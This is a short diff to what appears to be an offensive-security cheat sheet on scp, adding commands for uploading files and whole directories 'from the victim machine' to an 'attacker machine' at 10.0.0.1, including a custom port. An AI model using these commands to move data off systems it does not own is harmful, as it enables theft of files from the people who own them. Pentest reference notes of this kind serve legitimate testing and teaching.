@@ -116,5 +116,13 @@ scp -i sshkey.pem user@10.0.0.1:/home/user/test.txt /tmp/
 root# scp -i ~/.ssh/id_rsa myfile.txt user@10.0.0.1
 
 • From the victim machine, upload something on the attacker machine
+scp myfile root@10.0.0.1:/home/kiosec/Documents/
 scp myfile.txt root@10.0.0.1:/root/ .
+
+using a custom port, you can specify it with the -P flag:
+scp -P 2222 myfile root@10.0.0.1:/home/kiosec/Documents/
+
+copy an entire directory, use the -r flag for recursive copy:
+scp -r /path/to/local/folder root@10.0.0.1:/home/kiosec/Documents/
+
 ```
